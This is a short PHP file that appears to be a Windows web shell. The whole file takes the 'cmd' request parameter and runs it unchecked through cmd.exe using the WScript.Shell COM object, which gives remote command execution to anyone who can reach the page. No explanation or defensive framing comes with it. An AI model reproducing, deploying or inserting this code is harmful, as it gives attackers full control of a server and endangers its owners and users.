<?php
$command = $_REQUEST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec('cmd.exe /c '.$command);
?>